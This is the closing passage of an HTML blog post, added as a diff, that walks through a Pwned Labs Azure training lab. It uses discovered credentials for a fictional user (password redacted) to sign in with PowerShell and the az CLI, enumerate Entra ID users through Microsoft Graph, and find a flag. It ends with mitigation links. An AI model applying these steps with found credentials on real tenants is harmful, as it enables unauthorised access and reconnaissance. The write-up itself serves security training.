+</span></span><span class="line"><span class="cl"><span class="c"># Import the required modules</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">Az</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">MSAL</span><span class="p">.</span><span class="nb">PS
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl"><span class="c"># Define your Azure AD credentials</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Username</span> <span class="p">=</span> <span class="s2">&#34;marcus@megabigtech.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Password</span> <span class="p">=</span> <span class="s2">&#34;[REDACTED]&#34;</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="p">(</span><span class="nv">$Username</span><span class="p">,</span> <span class="nv">$Password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Authenticate to Azure AD using the specified credentials</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span> <span class="n">-Credential</span> <span class="nv">$Credential</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Define the Microsoft Graph API URL</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$GraphApiUrl</span> <span class="p">=</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/users?</span><span class="nv">$select</span><span class="s2">=displayName,userPrincipalName&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Retrieve the access token for Microsoft Graph</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$AccessToken</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-AzAccessToken</span> <span class="n">-ResourceType</span> <span class="n">MSGraph</span><span class="p">).</span><span class="py">Token</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Create a headers hashtable with the access token</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Authorization&#34;</span> <span class="p">=</span> <span class="s2">&#34;Bearer </span><span class="nv">$AccessToken</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ContentType&#34;</span>   <span class="p">=</span> <span class="s2">&#34;application/json&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$response</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="n">-Uri</span> <span class="nv">$GraphApiUrl</span> <span class="n">-Method</span> <span class="n">Get</span> <span class="n">-Headers</span> <span class="nv">$headers</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Output the response (formatted as JSON)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$response</span> <span class="p">|</span> <span class="nb">ConvertTo-Json</span>
+</span></span></code></pre></div><p>Go ahead and type the following command to initiate the authentication process to log into the Azure account we just discovered with your username and password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ az login
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/4Ay69mu.png"></p>
+<p><img loading="lazy" src="https://i.imgur.com/qtmrUSu.png"></p>
+<p>For authentication context we can confirm that we truly have the Azure Account Details of our compromised user :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ az account show
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;environmentName&#34;</span>: <span class="s2">&#34;AzureCloud&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;homeTenantId&#34;</span>: <span class="s2">&#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span>: <span class="s2">&#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;isDefault&#34;</span>: true,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;managedByTenants&#34;</span>: <span class="o">[]</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span>: <span class="s2">&#34;Microsoft Azure Sponsorship&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;state&#34;</span>: <span class="s2">&#34;Enabled&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantDefaultDomain&#34;</span>: <span class="s2">&#34;megabigtech.com&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantDisplayName&#34;</span>: <span class="s2">&#34;Default Directory&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantId&#34;</span>: <span class="s2">&#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;user&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name&#34;</span>: <span class="s2">&#34;marcus@megabigtech.com&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span>: <span class="s2">&#34;user&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>You can then navigate to <a href="https://portal.azure.com/">https://portal.azure.com/</a>, to login to the web-based dashboard that manages all of the Azure resources.</p>
+<p><img loading="lazy" src="https://i.imgur.com/s1ssXTb.png"></p>
+<p>Go ahead and open up the Azure cloud shell with the console icon by the top right</p>
+<p><img loading="lazy" src="https://i.imgur.com/2IOvzfV.png"></p>
+<p>Once this is done you should have a cloud console like the below</p>
+<p><img loading="lazy" src="https://i.imgur.com/Iq8Y9X0.png"></p>
+<p>Using this <a href="https://github.com/andreipintica/Azure-PowerShell-CheatSheet?tab=readme-ov-file#connect-to-azure-active-directory">cheatsheet</a> for list of commands i was able to come up with the below command to list the properties of our current user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">marcus</span><span class="p">&gt;</span> <span class="nb">Connect-AzureAD</span>                                                             
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">marcus</span><span class="p">&gt;</span> <span class="nb">Get-AzureADUser</span> <span class="n">-ObjectId</span> <span class="n">marcus</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-Property</span> <span class="p">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-</span><span class="n">-SNIP</span><span class="p">--</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectId</span>                       <span class="err">:</span> <span class="n">41c178d3-c246</span><span class="p">-</span><span class="n">4c00</span><span class="p">-</span><span class="n">98f0</span><span class="p">-</span><span class="n">8113bd631676</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectType</span>                     <span class="err">:</span> <span class="n">User</span>
+</span></span><span class="line"><span class="cl"><span class="n">AccountEnabled</span>                 <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">AgeGroup</span>                       <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">AssignedLicenses</span>               <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">AssignedPlans</span>                  <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">City</span>                           <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">CompanyName</span>                    <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">ConsentProvidedForMinor</span>        <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Country</span>                        <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">CreationType</span>                   <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Department</span>                     <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">DirSyncEnabled</span>                 <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span>                    <span class="err">:</span> <span class="n">Marcus</span> <span class="n">Hutch</span>
+</span></span><span class="line"><span class="cl"><span class="n">FacsimileTelephoneNumber</span>       <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">GivenName</span>                      <span class="err">:</span> <span class="n">Marcus</span>
+</span></span><span class="line"><span class="cl"><span class="n">IsCompromised</span>                  <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">ImmutableId</span>                    <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">JobTitle</span>                       <span class="err">:</span> <span class="n">Flag</span><span class="err">:</span> <span class="p">[</span><span class="no">REDACTED</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">LastDirSyncTime</span>                <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">LegalAgeGroupClassification</span>    <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Mail</span>                           <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">MailNickName</span>                   <span class="err">:</span> <span class="n">marcus</span>
+</span></span><span class="line"><span class="cl"><span class="n">Mobile</span>                         <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">OnPremisesSecurityIdentifier</span>   <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">OtherMails</span>                     <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">PasswordPolicies</span>               <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">PasswordProfile</span>                <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">PhysicalDeliveryOfficeName</span>     <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">PostalCode</span>                     <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">PreferredLanguage</span>              <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">ProvisionedPlans</span>               <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ProvisioningErrors</span>             <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ProxyAddresses</span>                 <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">RefreshTokensValidFromDateTime</span> <span class="err">:</span> <span class="mf">9</span><span class="p">/</span><span class="mf">26</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">9</span><span class="err">:</span><span class="mf">04</span><span class="err">:</span><span class="mf">50</span> <span class="n">PM</span>
+</span></span><span class="line"><span class="cl"><span class="n">ShowInAddressList</span>              <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">SignInNames</span>                    <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">SipProxyAddress</span>                <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">State</span>                          <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">StreetAddress</span>                  <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Surname</span>                        <span class="err">:</span> <span class="n">Hutch</span>
+</span></span><span class="line"><span class="cl"><span class="n">TelephoneNumber</span>                <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">UsageLocation</span>                  <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">UserPrincipalName</span>              <span class="err">:</span> <span class="n">marcus</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserState</span>                      <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">UserStateChangedOn</span>             <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">UserType</span>                       <span class="err">:</span> <span class="n">Member</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">marcus</span><span class="p">&gt;</span> 
+</span></span></code></pre></div><p>That would be all for today ( -_•)︻デ═一</p>
+<h2 id="references--mitigations"><strong>References &amp; Mitigations</strong><a hidden class="anchor" aria-hidden="true" href="#references--mitigations">#</a></h2>
+<ul>
+<li><strong>Lab Link :</strong> <a href="https://pwnedlabs.io/labs/azure-blob-container-to-initial-access">https://pwnedlabs.io/labs/azure-blob-container-to-initial-access</a></li>
+<li><a href="https://learn.microsoft.com/en-us/azure/storage/blobs/security-recommendations">Security recommendations for Blob storage</a></li>
+<li><a href="https://www.varonis.com/blog/azure-blob-storage">Securing Azure Blob Storage: Set-Up Guide</a></li>
+<li><a href="https://learn.microsoft.com/en-us/shows/inside-azure-for-it/security-best-practices-for-azure-blob-storage">Security best practices for Azure Blob Storage</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/azure/">Azure</a></li>
+      <li><a href="http://localhost:1313/tags/red-teaming/">Red Teaming</a></li>
+      <li><a href="http://localhost:1313/tags/entra-id/">Entra-ID</a></li>
+      <li><a href="http://localhost:1313/tags/powershell/">Powershell</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/intro_to_azure_recon_with_bloodhound/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Intro to Azure Recon with BloodHound</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
